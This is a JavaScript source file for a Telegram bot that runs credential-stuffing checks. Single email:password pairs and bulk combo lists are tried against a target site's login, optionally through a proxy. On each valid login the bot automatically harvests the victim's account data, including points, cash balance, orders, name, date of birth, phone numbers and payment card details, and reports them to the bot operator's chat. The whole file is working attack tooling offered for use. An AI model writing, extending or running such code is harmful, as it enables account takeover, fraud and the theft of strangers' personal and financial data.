const { Telegraf, Markup } = require('telegraf');

// HTTP-based credential checker
const { checkCredentials } = require('./httpChecker');
const { closeSession } = require('./automation/http/sessionManager');
const { captureAccountData } = require('./automation/http/httpDataCapture');
const { registerBatchHandlers, abortActiveBatch, hasActiveBatch } = require('./telegram/batchHandlers');
const {
  buildStartMessage,
  buildHelpMessage,
  buildGuideMessage,
  buildGuardError,
  buildCheckQueued,
  buildCheckProgress,
  buildCheckResult,
  buildCheckAndCaptureResult,
  buildCheckError,
  buildCapturePrompt,
  buildCaptureExpired,
  buildCaptureSummary,
  buildCaptureFailed,
  buildCaptureSkipped,
  escapeV2,
  formatBytes,
  formatDurationMs,
} = require('./telegram/messages');
const fs = require('fs').promises;
const { createLogger } = require('./logger');

const log = createLogger('telegram');

/**
 * Validates and parses the credential string format "user:pass".
 * @param {string} credentialString - Raw credential string
 * @returns {Object|null} { username, password } or null if invalid
 */
function parseCredentials(credentialString) {
  if (!credentialString || typeof credentialString !== 'string') {
    return null;
  }

  const parts = credentialString.split(':');
  if (parts.length !== 2 || !parts[0].trim() || !parts[1].trim()) {
    return null;
  }

  return {
    username: parts[0].trim(),
    password: parts[1].trim(),
  };
}

/**
 * Validates email format.
 * @param {string} email - Email to validate
 * @returns {boolean} True if valid email format
 */
function isValidEmail(email) {
  if (!email || typeof email !== 'string') {
    return false;
  }

  const trimmed = email.trim();
  if (!trimmed || trimmed.length > 254) {
    return false;
  }

  const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return pattern.test(trimmed);
}

/**
 * Basic input guard to keep Telegram commands tidy and safe.
 * @param {string} raw - Raw credential string
 * @returns {{valid: boolean, error?: string}}
 */
function guardInput(raw) {
  if (!raw || typeof raw !== 'string') {
    return { valid: false, error: 'Provide credentials in the form `.chk email:password`.' };
  }

  const input = raw.trim();
  if (!input) {
    return { valid: false, error: 'Provide credentials in the form `.chk email:password`.' };
  }

  if (input.length > 200) {
    return { valid: false, error: 'Input too long (max 200 characters).' };
  }

  if (input.includes('\n')) {
    return { valid: false, error: 'Use a single-line `email:password` pair.' };
  }

  const parts = input.split(':');
  if (parts.length !== 2) {
    return { valid: false, error: 'Use a single colon to separate email and password.' };
  }

  const [user, pass] = parts.map((p) => p.trim());
  if (!user || !pass) {
    return { valid: false, error: 'Both email and password are required.' };
  }

  if (!isValidEmail(user)) {
    return { valid: false, error: 'Email format looks invalid.' };
  }

  return { valid: true };
}

/**
 * Initializes and sets up the Telegram handler.
 * @param {string} botToken - Telegram bot token
 * @param {Object} [options] - Optional configuration
 * @returns {Telegraf} Configured bot instance
 */
function initializeTelegramHandler(botToken, options = {}) {
  const bot = new Telegraf(botToken);

  // Handle /start command
  bot.start(async (ctx) => {
    await ctx.reply(buildStartMessage(), {
      parse_mode: 'MarkdownV2',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('📚 Guide', 'guide'), Markup.button.callback('❓ Help', 'help')],
      ]),
    });
  });

  // Handle /help command
  bot.command('help', async (ctx) => {
    await ctx.reply(buildHelpMessage(), { parse_mode: 'MarkdownV2' });
  });

  // Handle /stop command - abort active batch
  bot.command('stop', async (ctx) => {
    const chatId = ctx.chat.id;
    if (hasActiveBatch(chatId)) {
      abortActiveBatch(chatId);
      await ctx.reply(escapeV2('⏹ Aborting batch, please wait...'), { parse_mode: 'MarkdownV2' });
    } else {
      await ctx.reply(escapeV2('⚠️ No active batch to stop.'), { parse_mode: 'MarkdownV2' });
    }
  });

  // Register batch handlers (HOTMAIL uploads and ULP URLs)
  registerBatchHandlers(
    bot,
    { ...options, checkCredentials },
    { escapeV2, formatBytes, formatDurationMs }
  );

  // Handle .chk command
  bot.hears(/^\.chk\s+(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const credentialString = ctx.match[1].trim();
    const startedAt = Date.now();
    const maskUser = (user) => {
      if (!user || user.length < 3) return '***';
      return `${user.slice(0, 3)}***${user.slice(-2)}`;
    };

    // Guard input
    const guard = guardInput(credentialString);
    if (!guard.valid) {
      await ctx.reply(buildGuardError(guard.error), { parse_mode: 'MarkdownV2' });
      return;
    }

    // Parse credentials
    const creds = parseCredentials(credentialString);
    if (!creds) {
      await ctx.reply(buildGuardError('Failed to parse credentials. Format: `.chk username:password`'), {
        parse_mode: 'MarkdownV2',
      });
      return;
    }

    log.info(`[chk] start user=${maskUser(creds.username)}`);

    // Send processing message (will be edited later)
    const statusMsg = await ctx.reply(buildCheckQueued(), { parse_mode: 'MarkdownV2' });

    const updateStatus = async (text) => {
      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, text, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        log.warn('Status edit failed:', err.message);
      }
    };

    try {
      // Keep creds in state for follow-up capture summary (masked via spoiler later).
      ctx.state.lastUsername = creds.username;
      ctx.state.lastPassword = creds.password;

      // Check credentials
      const result = await checkCredentials(
        creds.username,
        creds.password,
        {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          screenshotOn: options.screenshotOn || false,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
          headless: options.headless,
          deferCloseOnValid: true, // keep session open for optional capture flow
          onProgress: async (phase) => {
            await updateStatus(buildCheckProgress(phase));
          },
        }
      );

      // Format result message with masked username
      const durationMs = Date.now() - startedAt;
      log.info(`[chk] finish status=${result.status} user=${maskUser(creds.username)} time=${durationMs}ms`);
      
      // Edit message with final result
      await updateStatus(buildCheckResult(result, creds.username, durationMs, creds.password));

      // Always remove any screenshot file quietly
      if (result.screenshot) {
        await fs.unlink(result.screenshot).catch(() => {});
      }

      // Automatically capture data if credentials are VALID
      if (result.status === 'VALID' && result.session) {
        try {
          log.info(`[chk] capturing account data...`);
          await updateStatus(buildCheckProgress('capture'));
          
          const capture = await captureAccountData(result.session, { timeoutMs: options.timeoutMs || 60000 });
          const finalMessage = buildCheckAndCaptureResult(result, capture, creds.username, durationMs, creds.password);
          await updateStatus(finalMessage);

          log.info(`[chk] captured: points=${capture.points} rank=${capture.rank} cash=${capture.cash} lastOrder=${capture.latestOrder} orderId=${capture.latestOrderId}`);
          if (capture.profile) {
            const phones = [capture.profile.mobilePhone, capture.profile.homePhone, capture.profile.fax].filter(Boolean).join('/') || 'n/a';
            log.info(`[chk] profile: name=${capture.profile.name} (${capture.profile.nameKana || ''}) email=${capture.profile.email} dob=${capture.profile.dob} phone=${phones}`);
            if (capture.profile.cards && capture.profile.cards.length > 0) {
              capture.profile.cards.forEach((card, idx) => {
                log.info(`[chk] card[${idx}]: ${card.brand} ****${card.last4} exp=${card.expiry} owner=${card.owner}`);
              });
            }
          }
        } catch (captureErr) {
          log.warn(`[chk] capture failed: ${captureErr.message}`);
          // Still show the check result even if capture failed
          await updateStatus(buildCheckResult(result, creds.username, durationMs, creds.password));
        } finally {
          // Clean up session
          closeSession(result.session);
        }
      } else if (result.status === 'VALID' && !result.session) {
        log.warn(`[chk] no session for capture (deferCloseOnValid=false?)`);
      }
    } catch (err) {
      log.error('Credential check error:', err.message);
      log.error(`[chk] error user=${maskUser(creds.username || 'unknown')} msg=${err.message}`);
      
      // Edit status message to show error
      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, buildCheckError(err.message), {
          parse_mode: 'MarkdownV2',
        });
      } catch (editErr) {
        await ctx.reply(buildCheckError(err.message), { parse_mode: 'MarkdownV2' });
      }
    }
  });

  // Handle inline button callbacks
  bot.action('guide', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(buildGuideMessage(), { parse_mode: 'MarkdownV2' });
  });

  bot.action('help', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(buildHelpMessage(), { parse_mode: 'MarkdownV2' });
  });

  // Launch bot
  bot.launch();
  
  log.success('Bot launched successfully!');

  return bot;
}

module.exports = {
  initializeTelegramHandler,
  parseCredentials,
  guardInput,
  isValidEmail,
};
